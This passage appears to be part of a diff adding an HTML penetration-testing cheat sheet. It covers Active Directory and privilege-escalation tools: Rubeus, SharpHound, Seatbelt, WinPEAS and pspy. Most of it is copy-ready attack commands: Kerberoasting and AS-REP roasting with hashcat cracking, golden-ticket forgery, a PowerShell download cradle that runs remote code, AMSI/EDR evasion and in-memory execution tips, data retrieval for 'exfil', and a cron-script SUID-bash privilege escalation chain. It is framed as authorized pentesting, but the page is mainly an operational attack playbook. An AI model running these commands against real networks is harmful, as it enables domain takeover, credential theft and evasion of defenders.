golden /user:Administrator /domain:example.com /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt", "why": "With the krbtgt account's NTLM hash (usually obtained via DCSync), forge a TGT for any user, granting full domain access and long-term persistence.", "look": "Confirmation of ticket forged and imported into the current session.", "next": "This is one of the most severe possible findings \u2014 verify with a lab/authorized test before ever reporting this capability, and always operate with client authorization for anything this destructive.", "err": "Fails \u2014 confirm the domain SID and krbtgt hash format (NTLM, not the full Kerberos key) are correct."}, {"label": "List cached Kerberos tickets", "code": "Rubeus.exe klist", "why": "See exactly which tickets are cached in the current logon session, useful for confirming a ptt operation worked.", "look": "A list of cached TGT/TGS entries with expiry times.", "next": "Use dump to extract any interesting ticket for offline use elsewhere.", "err": "Empty \u2014 no tickets cached yet, or you're not in the expected logon session."}], "options": [["/ptt", "Inject the resulting ticket directly into the current session"], ["/format:hashcat", "Output in a directly hashcat-crackable format"], ["/outfile:<path>", "Save output to a file instead of console only"], ["/nowrap", "Prevent line-wrapping of base64 ticket blobs (needed for reliable copy-paste)"]], "combos": [{"title": "Targeted Kerberoasting of high-value-sounding accounts", "explain": "Rather than roasting every SPN account and hoping, efficient testers first identify service accounts with suggestive names via PowerView/BloodHound, then Kerberoast only those \u2014 reducing noise (fewer TGS-REQ events fired) while focusing cracking effort where the odds of a weak password are highest.", "code": "Get-NetUser -SPN | Select samaccountname,serviceprincipalname\nRubeus.exe kerberoast /user:svc-sql /outfile:svc_sql.hash\nhashcat -m 13100 svc_sql.hash rockyou.txt --force"}, {"title": "AS-REP roast as a zero-credential first move", "explain": "Because AS-REP roasting requires no valid credentials at all, it's one of the very first Kerberos attacks tried the moment you have network access to a DC \u2014 often before you've even authenticated as anything.", "code": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\nhashcat -m 18200 asrep.txt rockyou.txt --force"}]}, {"id": "sharphound-ps1", "cat": "Active Directory", "name": "SharpHound.ps1", "tagline": "PowerShell wrapper for the BloodHound AD data collector.", "overview": "SharpHound.ps1 wraps the same underlying C# collector as SharpHound.exe but launches it via PowerShell (Invoke-BloodHound), useful when you already have a PowerShell-based foothold and don't want to drop a separate .exe to disk.", "note": "All commands and collection methods documented are accurate. Note: BloodHound itself has moved to BloodHound CE (Community Edition) as the actively maintained version, which changed the ingestion format from the old zip-of-JSONs to a different upload flow via its API \u2014 the SharpHound collector output format and these collection method names remain correct, but confirm your BloodHound server version matches the SharpHound collector version, since mismatches cause silent ingestion failures.", "info": "Just like Rubeus and PowerUp, the reflective load-and-run PowerShell pattern (IEX download cradle) is heavily flagged by AMSI on monitored hosts \u2014 the .exe variant executed via execute-assembly-style in-memory loading is now generally preferred for stealth.", "commands": [{"label": "Load the script", "code": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound/master/SharpHound.ps1')", "why": "Load the collector into memory without writing to disk.", "look": "No output on success.", "next": "Run Invoke-BloodHound with your chosen collection method.", "err": "Blocked by AMSI \u2014 consider the .exe variant loaded via reflection instead."}, {"label": "Default collection", "code": "Invoke-BloodHound -CollectionMethod Default", "why": "Collect the standard, broadly useful dataset: sessions, group membership, local admin rights, and basic object properties.", "look": "A timestamped zip file containing JSON data.", "next": "Upload the zip into the BloodHound GUI/CE ingestor for graph analysis.", "err": "Empty/small zip \u2014 check you have read access to the domain and aren't heavily rate-limited by LDAP query throttling."}, {"label": "Full collection including ACLs and trusts", "code": "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp", "why": "Gather every collection type BloodHound understands, including ACL edges which reveal non-obvious privilege escalation paths.", "look": "A larger, more complete zip covering ACLs, trusts, GPOs, and sessions.", "next": "Analyze the imported graph for shortest paths to Domain Admin from your current compromised principal.", "err": "Partial data \u2014 some collection methods (e.g. LoggedOn) require local admin on target computers to succeed fully."}, {"label": "Stealth collection", "code": "Invoke-BloodHound -CollectionMethod All -Stealth", "why": "Spread out and slow down collection traffic to reduce the chance of tripping volume-based detection rules.", "look": "The same data collected, just more slowly and quietly.", "next": "Best used on engagements with an active, attentive blue team/SOC watching for enumeration spikes.", "err": "Slower completion is expected/normal \u2014 this is the tradeoff for reduced detection risk."}], "options": [["-CollectionMethod", "Default / All / DCOnly / Session / LoggedOn / ACL / Trusts / LocalGroup"], ["-Stealth", "Reduced-noise collection mode"], ["-Domain", "Target a specific domain in a multi-domain forest"], ["-OutputDirectory", "Where to write the resulting zip"]], "combos": [{"title": "DConly-first for low-noise initial mapping", "explain": "On monitoring-sensitive engagements, running -CollectionMethod DCOnly first (which only queries the domain controller via LDAP, generating zero direct traffic to individual workstations) gives a solid initial graph before deciding whether the noisier full collection is worth the exposure.", "code": "Invoke-BloodHound -CollectionMethod DCOnly -OutputDirectory C:\\temp\n# review initial graph, then if justified:\nInvoke-BloodHound -CollectionMethod Session,LoggedOn,LocalGroup -Stealth"}]}, {"id": "sharphound-exe", "cat": "Active Directory", "name": "SharpHound.exe", "tagline": "Native compiled BloodHound data collector.", "overview": "The compiled .exe version of the same collector as SharpHound.ps1 \u2014 functionally identical collection methods, but as a standalone binary it's easier to run via in-memory execution frameworks (execute-assembly) without touching PowerShell/AMSI at all, which is the main reason operators pick it over the .ps1 version on monitored hosts.", "note": "Commands and flags are correct. One clarification: the exe uses <code>-c</code> or <code>--CollectionMethods</code> (plural) while the PowerShell version uses <code>-CollectionMethod</code> (singular) \u2014 this file's flags are documented correctly, but it's a common source of copy-paste errors when switching between the two variants, worth double-checking every time.", "info": null, "commands": [{"label": "Default collection", "code": "SharpHound.exe", "why": "Run with zero arguments for the standard default collection set.", "look": "A zip file with JSON data written to the current directory.", "next": "Import into BloodHound for graph analysis.", "err": "Errors on launch \u2014 confirm .NET version compatibility with the target host's installed runtime."}, {"label": "Full collection to a specific directory", "code": "SharpHound.exe -c All --OutputDirectory C:\\temp", "why": "Collect every data type, saved to a controlled location for easy retrieval/exfil.", "look": "A comprehensive zip in C:\\temp.", "next": "Pull the file off the host and import into BloodHound.", "err": "Partial failures on specific methods \u2014 check current account's privileges for those specific queries (e.g. LoggedOn needs local admin)."}, {"label": "Stealth mode collection", "code": "SharpHound.exe -c All --Stealth", "why": "Same data, deliberately throttled to avoid triggering volume-based detections.", "look": "Slower but complete collection.", "next": "Best default choice on any engagement where a SOC is actively monitoring.", "err": "N/A \u2014 just expect a longer runtime."}, {"label": "Collect from a specific remote computer", "code": "SharpHound.exe -c All --ComputerName REMOTE_PC", "why": "Scope collection to a single machine of interest rather than the whole domain, useful for quick, targeted checks.", "look": "Data scoped to that computer only.", "next": "Use for spot-checking a single high-value target without a full domain-wide sweep.", "err": "Unreachable \u2014 confirm network connectivity and DNS resolution to that hostname."}], "options": [["-c / --CollectionMethods", "Collection type(s): Default, All, DCOnly, Session, LoggedOn, ACL, Trusts, LocalGroup"], ["--Stealth", "Throttled, lower-noise collection"], ["--ZipFileName", "Custom output zip name"], ["--NoZip", "Leave raw JSON files unzipped"]], "combos": [{"title": "In-memory execution to avoid disk artifacts", "explain": "Rather than writing SharpHound.exe to disk (a common EDR file-write detection trigger), operators load and run the compiled assembly reflectively through their C2's execute-assembly-equivalent feature, keeping the entire collection in memory.", "code": "# Example pattern via a C2 execute-assembly style command:\nexecute-assembly /path/to/SharpHound.exe -c All --Stealth --ZipFileName loot.zip\n# then retrieve the in-memory-collected file via the C2 download feature"}]}, {"id": "seatbelt", "cat": "Post-Exploitation", "name": "Seatbelt.exe", "tagline": "C# host-survey tool for security-relevant Windows configuration and artifact checks.", "overview": "Seatbelt performs the same category of enumeration as WinPEAS but as a native, modular .NET assembly with cleanly separated check groups \u2014 useful both offensively (privesc/artifact hunting) and defensively (as a host-hardening audit tool). It's often preferred over WinPEAS.bat when operating via an in-memory .NET execution channel.", "note": "Commands and group names documented are accurate. Worth adding: Seatbelt overlaps significantly with PowerUp/WinPEAS in what it detects (services, AlwaysInstallElevated, etc.) but adds valuable Windows-specific artifact checks not in the others \u2014 saved RDP connections, browser credential stores, Windows Credential Manager entries, and cloud credential files (AWS/Azure) left on disk, which have become increasingly common findings as more workstations have cloud CLI tools installed.", "info": null, "commands": [{"label": "Run every check", "code": "Seatbelt.exe -group=all", "why": "Comprehensive single-pass host survey across system, user, and misc categories.", "look": "A long structured report \u2014 scan for anything marked interesting or flagged with a warning color/marker.", "next": "Cross-reference findings against PowerUp/WinPEAS results to corroborate before acting.", "err": "Sparse output \u2014 the host may be well-hardened, or Seatbelt was partially blocked by AV/EDR mid-run."}, {"label": "Run a specific targeted check", "code": "Seatbelt.exe Hotfixes", "why": "Pull just the installed-patch list to research missing security updates without the noise of a full report.", "look": "A list of installed KB hotfix IDs.", "next": "Cross-reference the KB list against known unpatched CVEs for the host's exact build.", "err": "Empty \u2014 very unusual; verify the check name is spelled correctly (case-sensitive in some versions)."}, {"label": "Full detail, unfiltered", "code": "Seatbelt.exe -group=all -full", "why": "Remove default output filtering/truncation to see every raw data point collected.", "look": "Maximum detail per check, useful when default output hides something relevant.", "next": "Grep through the full output for specific keywords (password, key, token, credential).", "err": "N/A \u2014 output is simply larger; pipe to a file for easier review."}, {"label": "Remote enumeration with credentials", "code": "Seatbelt.exe -group=remote -computername=REMOTE_PC -username=DOMAIN\\zak -password=zak123", "why": "Run checks against a remote host using an already-compromised account, without needing an interactive session there.", "look": "System info, processes, and shares from the remote target.", "next": "Use findings to decide whether lateral movement to that host is worthwhile.", "err": "Access denied \u2014 the account may lack sufficient rights on the remote host, or WMI/WinRM is restricted."}], "options": [["-group=all/system/user/remote/misc", "Check category to run"], ["-full", "Disable output truncation/filtering"], ["-q", "Quiet mode, suppress banner"], ["-outputfile=<path>", "Write output to a file (txt or json)"]], "combos": [{"title": "Cloud-credential sweep on modern developer/ops workstations", "explain": "As more engineering staff have AWS/Azure CLI tools installed locally, checking for leftover cloud credential files has become a high-value, frequently overlooked check \u2014 Seatbelt's dedicated checks for these catch findings that generic privesc scripts miss entirely.", "code": "Seatbelt.exe CloudCredentials\nSeatbelt.exe DpapiMasterKeys\nSeatbelt.exe CredEnum"}, {"title": "Triangulating findings across three privesc tools", "explain": "Because Seatbelt, PowerUp, and WinPEAS each surface slightly different data, professionals cross-reference the three rather than trusting one blindly, especially before attempting anything destructive like Invoke-ServiceAbuse.", "code": "Seatbelt.exe -group=system -full > seatbelt.txt\n# alongside, in the same session:\n# Invoke-AllChecks > powerup.txt\n# winPEAS.bat > winpeas.txt\ngrep -i \"service\" seatbelt.txt powerup.txt winpeas.txt"}]}, {"id": "windows-combo", "cat": "Active Directory", "name": "Windows/AD Quick Combo Card", "tagline": "A condensed field card combining PowerView + Rubeus for when you don't want to flip between two dedicated references mid-engagement.", "overview": "This section deliberately overlaps with the dedicated PowerView and Rubeus pages above \u2014 it exists as a single-screen 'cheat card' pulling the highest-frequency commands from both tools into one place for the moment you're mid-shell on a target and need the fastest possible lookup, rather than scrolling two separate deep-dive sections.", "note": "Content matches the dedicated PowerView and Rubeus sections and has been verified there; nothing new to correct here beyond what's already flagged above (legacy PowerView syntax vs. dev-branch Get-Domain* cmdlets, and AMSI exposure for both toolsets).", "info": null, "commands": [{"label": "Domain Admins membership", "code": "Get-NetGroupMember -GroupName \"Domain Admins\"", "why": "Fastest single lookup for the highest-value target accounts.", "look": "Usernames in the group.", "next": "Cross-reference against Kerberoastable/AS-REP-roastable account lists.", "err": "Insufficient rights to query the group \u2014 highly unusual for a domain-authenticated read."}, {"label": "ACL check on a specific object", "code": "Get-ObjectAcl -SamAccountName zak -ResolveGUIDs", "why": "Check exactly what rights exist over a specific user/computer/group object.", "look": "Rights like GenericAll, WriteProperty, or ForceChangePassword.", "next": "If you (or a controlled account) hold an abusable right, exploit it directly (e.g. reset password via ForceChangePassword).", "err": "No interesting rights returned \u2014 object may be tightly locked down."}, {"label": "Kerberoast in one line", "code": ".\\Rubeus.exe kerberoast /outfile:hashes.txt", "why": "Grab every roastable hash in a single command when time is short.", "look": "hashes.txt populated with hashcat-ready hashes.", "next": "Crack offline immediately with hashcat -m 13100.", "err": "No SPNs found \u2014 domain has no legacy roastable service accounts."}, {"label": "Find unconstrained delegation hosts", "code": "Get-NetComputer -Unconstrained", "why": "Quick check for one of the most impactful AD misconfigurations.", "look": "Any computer object returned.", "next": "Set up Rubeus monitor mode against that host to capture any admin TGT that lands there.", "err": "None found \u2014 good hygiene on the client's part; move to constrained delegation checks."}, {"label": "Golden ticket forge (post-DCSync)", "code": ".\\Rubeus.exe golden /user:Administrator /domain:example.com /sid:<sid> /krbtgt:<hash> /ptt", "why": "Full domain persistence once the krbtgt hash has been obtained.", "look": "Ticket forged and injected confirmation.", "next": "Report as a critical finding; this level of access requires explicit authorization and careful handling.", "err": "Wrong SID/hash format \u2014 double check you're using the NTLM hash, not a Kerberos AES key, unless using /aes256."}], "options": [], "combos": [{"title": "The 60-second AD triage card", "explain": "When you land on a domain-joined box and need the fastest possible read on the environment before deciding your next move, this is the exact five-command sequence that gets you from zero to 'here's what's interesting' fastest.", "code": "Get-NetDomain\nGet-NetGroupMember -GroupName \"Domain Admins\"\nGet-NetComputer -Unconstrained\n.\\Rubeus.exe kerberoast /outfile:hashes.txt\n.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"}]}, {"id": "pspy", "cat": "Privilege Escalation", "name": "pspy", "tagline": "Unprivileged Linux process and filesystem event monitor \u2014 the go-to tool for spotting cron/timer-based privesc.", "overview": "pspy watches /proc for new processes without needing root, making it invaluable for catching cron jobs, systemd timers, or scripts run by root/other users that would otherwise be invisible to a low-privilege shell. It's a near-universal first step on Linux privesc once a foothold is established.", "note": "All flags documented are accurate. Worth adding: pspy has two common binary variants \u2014 <code>pspy32</code> and <code>pspy64</code> \u2014 always match architecture to the target (uname -m) or the binary will simply fail to execute; the original file only referenced the 64-bit build.", "info": "pspy is snapshot-based on /proc scanning, so extremely short-lived processes (sub-second) can still be missed between polling intervals \u2014 lowering -i (scan interval) trades CPU usage for a better chance of catching very fast-executing scripts.", "commands": [{"label": "Download the correct architecture binary", "code": "wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64\n# for 32-bit targets: pspy32", "why": "Grab the binary matching the target's CPU architecture \u2014 check with uname -m first.", "look": "Successful download of the correct binary.", "next": "chmod +x and run it.", "err": "Wrong architecture binary simply fails silently or with an exec format error \u2014 re-check uname -m."}, {"label": "Make it executable and run", "code": "chmod +x pspy64 && ./pspy64", "why": "Start live monitoring of new process creation and (optionally) file system events.", "look": "Real-time stream of PIDs, the invoking UID, and full command lines as they execute.", "next": "Watch specifically for anything running as UID 0 (root) that you can influence \u2014 a script path you can write to, for example.", "err": "No output \u2014 either nothing is running periodically, or you need to wait through a full cron interval (up to a minute or more)."}, {"label": "Monitor commands and filesystem events together", "code": "./pspy64 -pf", "why": "Combine process execution logging with file creation/modification events for full situational awareness.", "look": "Both new process launches and file touches in the same timeline.", "next": "Correlate a root cron job with a file it writes to/reads from that you might be able to tamper with.", "err": "Nothing suspicious \u2014 extend observation time; some jobs run hourly or daily, not every minute."}, {"label": "Watch a specific directory", "code": "./pspy64 -d /tmp", "why": "Focus exclusively on a directory known to be used by scheduled tasks, reducing noise from unrelated activity.", "look": "File creation/modification events scoped to /tmp only.", "next": "If a root-owned script writes predictable temp files there, look for a race-condition or symlink-based hijack opportunity.", "err": "No activity in that directory \u2014 try watching /var/log, /var/backups, or wherever the suspected job operates."}], "options": [["-p", "Print process events to stdout (default on)"], ["-f", "Print filesystem events to stdout"], ["-r/-d <dirs>", "Recursively / non-recursively watch specific directories"], ["-i <ms>", "Scan interval in milliseconds"], ["-c", "Colorized output for easier reading"]], "combos": [{"title": "Cron-to-privesc: the classic writable-script chain", "explain": "This is the textbook Linux privesc pattern pspy is built to catch: spot a root cron job calling a script, check if you can write to that script (or its path if it's called without an absolute path \u2014 PATH hijacking), then plant a payload and wait for the next execution.", "code": "./pspy64 -pf\n# observe: */5 * * * * root /opt/scripts/backup.sh\nls -la /opt/scripts/backup.sh\n# if writable:\necho 'chmod u+s /bin/bash' >> /opt/scripts/backup.sh\n# wait for next cron tick, then:\n/bin/bash -p"}, {"title": "Systemd timer discovery when cron looks clean", "explain": "On systems with no interesting entries in /etc/crontab, pspy frequently reveals systemd timer units instead, since those don't show up in traditional cron enumeration at all but still spawn root processes on a schedule.", "code": "./pspy64 -pf\n# observe unexpected root process spawns tied to systemd\nsystemctl list-timers --all\ncat /etc/systemd/system/*.timer"}]}, {"id": "winpeas", "cat": "Privilege Escalation", "name": "WinPEAS.bat", "tagline": "Batch-script Windows privilege escalation enumeration from the PEASS-ng suite.", "overview": "WinPEAS.bat performs a broad automated sweep of Windows privesc vectors: services, scheduled tasks, registry misconfigurations, stored credentials, and installed software versions. The batch-script form trades some detection depth for being lightweight and less likely to trip .NET-specific AV signatures than the compiled winPEASx64.exe.", "note": "Important currency note: the PEASS-ng project's primary maintained deliverable is now <code>winPEASx64.exe</code> / <code>winPEASx86.exe</code> (compiled, far more thorough, actively developed with color-coded output), while <code>winPEAS.bat</code> is a legacy, less actively maintained variant kept mainly for environments where dropping/running a compiled .exe is undesirable (e.g. certain AV heuristics flag unsigned .exe binaries more aggressively than a plain batch script). If you have the option, the .exe build will surface meaningfully more findings.", "info": null, "commands": [{"label": "Download the script", "code": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat", "why": "Get the batch-script build for environments where you want to avoid deploying a compiled .exe.", "look": "Successful download.", "next": "Transfer to the Windows target and run it.", "err": "Download fails \u2014 confirm outbound HTTPS is permitted from your attacking host, or transfer via SMB/HTTP server instead."}, {"label": "Run the full script", "code": "winPEAS.bat", "why": "Execute the full enumeration sweep across system, user, service, and credential checks.", "look": "A large text report \u2014 scan for anything called out as a notable misconfiguration.", "next": "Prioritize AlwaysInstallElevated, unquoted paths, and modifiable services for immediate follow-up.", "err": "Errors mid-run \u2014 some checks fail gracefully if permissions are insufficient; the rest of the report still completes."}, {"label": "Save output for offline review", "code": "winPEAS.bat > winpeas_output.txt", "why": "Capture the full report to a file for later, more careful analysis and for evidence in the final report.", "look": "A complete text file with the entire scan output.", "next": "Grep for keywords like password, key, AlwaysInstall, Unquoted across the saved file.", "err": "Empty file \u2014 confirm the redirection succeeded and the script actually completed."}, {"label": "Run a targeted subset of checks", "code": "winPEAS.bat servicesinfo,systeminfo", "why": "Reduce output volume and runtime by scoping to only the categories you currently care about.", "look": "Output limited to services and system info sections only.", "next": "Expand to other categories (userinfo, filesinfo) if the initial scope doesn't turn up anything.", "err": "No output for the requested category \u2014 verify the category name is spelled correctly."}], "options": [["quiet", "Suppress the ASCII banner and non-essential output"], ["servicesinfo/systeminfo/userinfo/filesinfo", "Scope to specific check categories"], ["log", "Log output while still displaying it live"]], "combos": [{"title": "Batch-first, then escalate to the .exe if AV allows", "explain": "On heavily monitored hosts, starting with the lower-signature .bat build and only escalating to the more thorough (but more heavily signatured) winPEASx64.exe if the batch run comes back clean is a sensible risk-managed approach, since triggering an EDR alert early can burn the whole engagement's stealth.", "code": "winPEAS.bat quiet > winpeas_bat.txt\n# if clean/inconclusive and risk tolerance allows:\n.\\winPEASx64.exe fast > winpeas_exe.txt"}, {"title": "Immediate cross-check against PowerUp", "explain": "Because WinPEAS.bat and PowerUp.ps1 use different detection logic under the hood, running both and diffing the notable findings catches misconfigurations either one might present less clearly on its own.", "code": "winPEAS.bat > winpeas.txt\n# in the same session:\n# Invoke-AllChecks | Out-File powerup.txt\ngrep -iE \"unquoted|alwaysinstall|modifiable\" winpeas.txt"}]}]
+</script>
+
+<script>
+const DATA = JSON.parse(document.getElementById('toolData').textContent);
+
+function esc(s){
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function renderCode(code){
+  return esc(code);
+}
+
+function buildNav(){
+  const nav = document.getElementById('navList');
+  let html = '';
+  let lastCat = null;
+  DATA.forEach((t,i)=>{
+    if(t.cat !== lastCat){
+      html += `<div class="nav-group-label">${t.cat}</div>`;
+      lastCat = t.cat;
+    }
+    html += `<a class="nav-item" href="#${t.id}" data-name="${t.name.toLowerCase()} ${t.tagline.toLowerCase()}" onclick="setActive('${t.id}')"><span class="nav-num">${String(i+1).padStart(2,'0')}</span>${t.name}</a>`;
+  });
+  nav.innerHTML = html;
+}
+
+function setActive(id){
+  document.querySelectorAll('.nav-item').forEach(el=>el.classList.remove('active'));
+  document.querySelectorAll(`.nav-item[href="#${id}"]`).forEach(el=>el.classList.add('active'));
+  if(window.innerWidth<=900) document.querySelector('.sidebar').classList.remove('open');
+}
+
+function filterNav(){
+  const q = document.getElementById('navSearch').value.toLowerCase();
+  document.querySelectorAll('.nav-item').forEach(el=>{
+    el.style.display = el.dataset.name.includes(q) ? 'flex' : 'none';
+  });
+  document.querySelectorAll('.nav-group-label').forEach(el=>el.style.display = q ? 'none' : 'block');
+}
+
+function buildContent(){
+  const el = document.getElementById('content');
+  let html = '';
+  DATA.forEach((t)=>{
+    html += `<section class="tool" id="${t.id}">`;
+    html += `<div class="tool-head">
+      <div>
+        <div class="tool-title-wrap"><h2 class="tool-title"><span class="tag">#</span> ${esc(t.name)}</h2></div>
+        <div class="tool-tagline">${esc(t.tagline)}</div>
+      </div>
+      <div class="badge-row">
+        <span class="badge cat">${t.cat}</span>
+        <span class="badge verified">✓ fact-checked 2026</span>
+      </div>
+    </div>`;
+
+    html += `<p class="overview">${t.overview}</p>`;
+
+    if(t.note){
+      html += `<div class="callout"><b>Fact-check note:</b> ${t.note}</div>`;
+    }
+    if(t.info){
+      html += `<div class="callout info"><b>Field note:</b> ${t.info}</div>`;
+    }
+
+    html += `<h3 class="sub">Core Commands</h3>`;
+    t.commands.forEach(c=>{
+      html += `<div class="cmd-block">
+        <div class="cmd-label"><span>${c.label}</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+        <pre><code>${renderCode(c.code)}</code></pre>
+        <div class="meta-grid">
+          <div class="meta-item why"><div class="k">Why</div><div class="v">${esc(c.why)}</div></div>
+          <div class="meta-item look"><div class="k">Look For</div><div class="v">${esc(c.look)}</div></div>
+          <div class="meta-item next"><div class="k">Next Step</div><div class="v">${esc(c.next)}</div></div>
+          <div class="meta-item err"><div class="k">If Nothing</div><div class="v">${esc(c.err)}</div></div>
+        </div>
+      </div>`;
+    });
+
+    if(t.options && t.options.length){
+      html += `<h3 class="sub">Quick Reference — Flags</h3>`;
+      html += `<table class="opts"><tr><th>Flag</th><th>Meaning</th></tr>`;
+      t.options.forEach(o=>{
+        html += `<tr><td class="flagcell">${esc(o[0])}</td><td>${esc(o[1])}</td></tr>`;
+      });
+      html += `</table>`;
+    }
+
+    html += `<h3 class="sub">Field Combos — How Efficient Pentesters Actually Chain This</h3>`;
+    t.combos.forEach((c,i)=>{
+      html += `<div class="combo-card">
+        <div class="combo-title"><span class="n">${i+1}</span> ${esc(c.title)}</div>
+        <div class="combo-explain">${esc(c.explain)}</div>
+        <div class="cmd-block" style="margin-bottom:14px;">
+          <div class="cmd-label"><span>chain</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><code>${renderCode(c.code)}</code></pre>
+        </div>
+      </div>`;
+    });
+
+    html += `</section>`;
+  });
+  el.innerHTML = html;
+}
+
+function copyCode(btn){
+  const code = btn.closest('.cmd-block').querySelector('code').textContent;
+  navigator.clipboard.writeText(code).then(()=>{
+    btn.textContent = 'COPIED';
+    btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent='COPY';btn.classList.remove('copied');},1400);
+  });
+}
+
+// scrollspy
+function setupScrollSpy(){
+  const sections = Array.from(document.querySelectorAll('section.tool'));
+  window.addEventListener('scroll', ()=>{
+    let current = sections[0];
+    for(const s of sections){
+      if(s.getBoundingClientRect().top - 100 <= 0) current = s;
+    }
+    if(current) setActive(current.id);
+  }, {passive:true});
+}
+
+buildNav();
+buildContent();
+setupScrollSpy();
+</script>
+</body>
+</html>
